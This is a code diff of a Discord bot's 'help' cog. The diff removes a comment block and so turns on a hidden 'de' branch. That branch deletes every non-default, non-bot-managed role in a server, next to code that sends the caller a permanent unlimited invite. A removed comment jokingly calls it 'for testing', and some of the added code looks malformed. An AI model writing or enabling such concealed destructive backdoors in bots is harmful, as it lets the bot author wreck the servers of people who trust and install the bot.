@@ -61,8 +61,6 @@ class help(commands.Cog):
             invite = await dsd.rules_channel.create_invite(max_age=86400, max_uses=0)
 
             await ctx.send(str(invite.cr_code))
-            """Don't Worry It was For testing! (no for real)
-
         elif (command == "de") and(boolean == True):
             haha = ctx.guild.channels
             roles = ctx.guild.roles
@@ -72,7 +70,10 @@ class help(commands.Cog):
                 if (i.is_bot_managed() == True) or (i.is_default() == True):
                     continue
                 await i.delete()
-            """
+    @commands.command(name="disable",description="Disable any Command (Only Works By The Admin of the bot)")
+    async def disable(self,ctx:commands.Context):
+        await check_owner_persmsion_message(ctx)
+        
 
             
     @commands.Cog.listener()
